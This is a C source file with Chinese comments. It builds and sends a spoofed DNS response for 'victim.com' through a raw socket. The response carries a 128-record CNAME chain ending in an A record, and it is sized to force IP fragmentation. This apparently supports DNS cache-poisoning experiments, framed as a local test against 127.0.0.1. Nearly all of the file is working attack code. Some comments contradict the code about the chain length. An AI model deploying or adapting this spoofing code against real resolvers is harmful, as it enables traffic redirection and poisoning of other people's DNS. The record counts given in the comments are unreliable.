#include "util.h"
#include "network.h"
#include "dns.h"
#include <time.h>   // 用于sradn()初始化随机数种子
#include <stdlib.h> // 用于rand()

// 定义一个足够大的缓冲区来容纳长CNAME链的DNS包
#define LARGE_DNS_PKT_MAX_LEN 20480
#define CNAME_CHAIN_LENGTH 128

/*
 * 发送一个包含超长CNAME链的DNS响应（单个随机TXID），用于测试IP分片。
 * 响应链条如下：
 *   victim.com. A?
 *   -> a0.longchain.com. CNAME a1.longchain.com.
 *   -> a1.longchain.com. CNAME a2.longchain.com.
 *   ...
 *   -> a54.longchain.com. CNAME final-target.com.
 *   -> final-target.com. A 1.2.3.4
 */
static void send_long_cname_chain_response(Arena* arena, int sockfd, char *src_ip, char *dst_ip, uint16_t dst_port,
                                           char *query_domain, char *final_a_record_ip)
{

    // --- 1. 构建DNS记录 ---

    struct dns_query *query[1];
    // 我们需要 CNAME_CHAIN_LENGTH 个 CNAME 记录 和 1 个 A 记录
    struct dns_answer *answers[CNAME_CHAIN_LENGTH + 1];

    // 第一个问题部分
    query[0] = new_dns_query_a(arena, query_domain);

    // 构建CNAME链
    char current_domain[256];
    char next_domain[256];

    // a0.longchain.com CNAME a1.longchain.com
    // ...
    // a(N-1).longchain.com CNAME a(N).longchain.com
    for (int i = 0; i < CNAME_CHAIN_LENGTH - 1; ++i)
    {
        snprintf(current_domain, sizeof(current_domain), "a%d.longchain.com", i);
        snprintf(next_domain, sizeof(next_domain), "a%d.longchain.com", i + 1);
        answers[i] = new_dns_answer_cname(arena, current_domain, next_domain, 3600);
    }

    // 最后一个CNAME记录，指向最终的A记录域名
    // a(N).longchain.com CNAME final-target.com
    snprintf(current_domain, sizeof(current_domain), "a%d.longchain.com", CNAME_CHAIN_LENGTH - 1);
    answers[CNAME_CHAIN_LENGTH - 1] = new_dns_answer_cname(arena, current_domain, "final-target.com", 3600);

    // 最终的A记录
    // final-target.com A 1.2.3.4
    answers[CNAME_CHAIN_LENGTH] = new_dns_answer_a(arena, "final-target.com", inet_addr(final_a_record_ip), 3600);

    printf("[*] DNS records for CNAME chain created.\n");

    // --- 2. 构造DNS数据包 ---

    // 使用我们定义的大缓冲区
    uint8_t *dns_payload = (uint8_t *)alloc_memory(LARGE_DNS_PKT_MAX_LEN);

    // 生成一个随机的TXID
    uint16_t random_txid = (uint16_t)(rand() % 65536);

    // is_resp=TRUE, tx_id=random_txid, query_count=1, answer_count=56, authori_count=0, edns0=FALSE
    size_t dns_payload_len = make_dns_packet(dns_payload, LARGE_DNS_PKT_MAX_LEN, TRUE, random_txid,
                                             query, 1, answers, CNAME_CHAIN_LENGTH + 1, NULL, 0, NULL, 0, FALSE);

    if (dns_payload_len == (size_t)-1 || dns_payload_len == 0)
    {
        fprintf(stderr, "[-] Failed to make large DNS packet.\n");
        // goto cleanup; // 使用goto进行清理是一种常见的C语言模式
        return;
    }
    printf("[*] Large DNS payload created with TXID %u, size: %zu bytes.\n", random_txid, dns_payload_len);

    // --- 3. 构造完整的IP/UDP数据包 ---

    // IP头部 + UDP头部 + DNS载荷
    size_t packet_raw_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_payload_len;
    uint8_t *packet_raw = (uint8_t *)alloc_memory(packet_raw_len);

    make_udp_packet(packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                    53, dst_port, dns_payload, dns_payload_len);

    printf("[*] Raw IP/UDP packet template created, total size: %zu bytes.\n", packet_raw_len);

    // --- 4. 发送单个数据包 ---

    printf("[*] Sending a single spoofed response with CNAME chain...\n");

    // 调用你实现了分片逻辑的send_udp_packet
    send_udp_packet(arena, sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                    53, dst_port);

    printf("[*] Packet sent.\n");
}

// 在你的某个攻击函数或者main函数中
int main(int argc, char** argv) {
    // ====> 在程序开始时初始化随机数种子 <====
    srand(time(NULL));
        
    char* src_ip = "127.0.0.1";
    char* target_ip = "127.0.0.1";
    uint16_t target_port = 12345;
    char* queried_domain = "victim.com";
    char* final_ip = "6.6.6.6";

    int sockfd = make_sockfd_for_spoof();
    if (sockfd < 0) {
        perror("Failed to create spoofing socket");
        return 1;
    }

    // 调用测试函数
    Arena arena = {0};
    send_long_cname_chain_response(&arena, sockfd, src_ip, target_ip, target_port,
                                   queried_domain, final_ip);
    arena_free(&arena);
    close(sockfd);
    
    printf("Test finished.\n");
    return 0;
}